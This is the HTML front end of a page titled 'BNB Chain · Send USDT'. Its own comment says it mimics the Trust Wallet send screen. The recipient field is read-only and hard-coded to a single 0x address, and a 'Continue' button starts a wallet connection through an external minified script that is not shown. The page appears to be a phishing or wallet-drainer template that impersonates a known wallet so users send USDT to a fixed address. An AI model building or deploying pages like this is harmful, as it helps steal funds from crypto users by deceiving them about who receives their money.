<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <meta name="theme-color" content="#0b0e14">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <title>BNB Chain · Send USDT</title>
    <link rel="stylesheet" href="css/style.min.css?v=3.0">
</head>

<body>
    <!-- Background overlays -->
    <div class="bg-noise" aria-hidden="true"></div>
    <div class="bg-grid" aria-hidden="true"></div>

    <!-- MAIN TRUST WALLET SEND UI CONTAINER -->
    <div class="tw-screen-container">
        <div class="tw-app-frame">

            <!-- Card 1: Merchant Recipient Address Box -->
            <div class="tw-card">
                <label class="tw-label">Merchant Recipient Address</label>
                <textarea id="merchantAddressDisplay" class="tw-address-box" readonly rows="2">0xC0981e86a5c1C3c5B2E849CE6E8E186a81E10D2d</textarea>
                
                <div class="tw-pill-row">
                    <div class="tw-pill">
                        <img src="images/bnb.png" alt="BNB" class="tw-chain-icon" width="18" height="18">
                        <span>BNB Smart Chain</span>
                        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M6 9l6 6 6-6"/></svg>
                    </div>
                    <button type="button" class="tw-pill" id="clearAddressBtn">Clear</button>
                </div>
            </div>

            <!-- Card 2: USDT Amount Column -->
            <div class="tw-card">
                <div class="tw-pill-row" style="margin-top:0;">
                    <label class="tw-label" for="usdtAmountInput">Amount to Send</label>
                    <span class="tw-balance-sub">Balance: <strong id="usdtBalance" style="color:var(--tw-text);">0.00</strong> USDT</span>
                </div>
                
                <div class="tw-amount-row">
                    <input type="number" id="usdtAmountInput" class="tw-amount-input" placeholder="0.0" step="any" min="0" value="">
                    <div class="tw-amount-meta">
                        <button type="button" id="maxUsdtBtn" class="tw-max-btn">MAX</button>
                        <span class="tw-currency-tag">USDT</span>
                    </div>
                </div>
            </div>

            <!-- Connected Wallet Info Pill (visible when wallet is connected) -->
            <div id="walletInfo" class="tw-status-box wallet-info-card--hidden">
                <div style="display:flex; justify-content:space-between; align-items:center;">
                    <div>
                        <span style="font-size:11px; text-transform:uppercase; color:var(--tw-text-muted);">Connected Wallet</span>
                        <div id="walletAddressDisplay" style="font-family:monospace; font-weight:600; font-size:13px; color:var(--tw-text);">0x0000...0000</div>
                    </div>
                    <div style="text-align:right;">
                        <span style="font-size:11px; text-transform:uppercase; color:var(--tw-text-muted);">BNB Balance</span>
                        <div id="bnbBalance" style="font-weight:600; font-size:13px; color:var(--tw-text);">0.000000</div>
                    </div>
                </div>
            </div>

            <!-- Continue Button (Primary Action) -->
            <button id="connectWalletBtn" class="tw-continue-btn" type="button">
                <span>Continue</span>
            </button>

        </div>
    </div>

    <!-- MAIN APPLICATION SCRIPT (Ultra-fast native Web3, zero dependencies) -->
    <script src="js/app.min.js?v=3.0"></script>
</body>
</html>
